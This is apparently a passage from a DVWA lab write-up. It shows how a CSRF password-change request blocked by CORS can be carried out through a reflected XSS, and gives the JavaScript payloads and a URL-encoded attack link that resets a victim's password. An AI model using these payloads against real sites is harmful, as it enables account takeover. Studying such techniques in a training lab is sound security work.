We can think initially of creating a fake HTML page with some javascript that will trigger the password change request. This is an HTML example

<html>
  <head>
    <title> Test! </title>
    <Script> var xmlHttp = new XMLHttpRequest(); var url = "http://evil/vulnerabilities/csrf/?password_new=newpass&password_conf=newpass&Change=Change"; xmlHttp.open("GET", url, false); xmlHttp.send(null); </Script>
  </head>
  <body>
    <h1>Hi!</h1>    
  </body>
</html>

This example however does not work because of CORS. In particular the http://evil website, which is the DVWA, did not enable CORS, and therefore we're not able to use javascript to request data from that website using a different origin, which we would be forced to. To actually weaponize this CSRF we need an XSS witin the origin of interest, which in our case is http://evil. For example, consider the XSS of the XSS Reflected medium section. We can trigger that xss as follows

 <Script> alert("1"); </Script>

Using this XSS we can trigger the malicious password change request with the following XSS script

 <Script> var xmlHttp = new XMLHttpRequest(); var url = "http://evil/vulnerabilities/csrf/?password_new=newpass&password_conf=newpass&Change=Change"; xmlHttp.open("GET", url, false); xmlHttp.send(null); </Script>

Finally, we can construct the GET request which triggers this XSS. When the user clicks on this link, we will also change their password into 'test'.

http://evil/vulnerabilities/xss_r/?name=%3CScript%3E+var+xmlHttp+%3D+new+XMLHttpRequest%28%29%3B+var+url+%3D+%22http%3A%2F%2Fevil%2Fvulnerabilities%2Fcsrf%2F%3Fpassword_new%3Dtest%26password_conf%3Dtest%26Change%3DChange%22%3B+xmlHttp.open%28%22GET%22%2C+url%2C+false%29%3B+xmlHttp.send%28null%29%3B+%3C%2FScript%3E
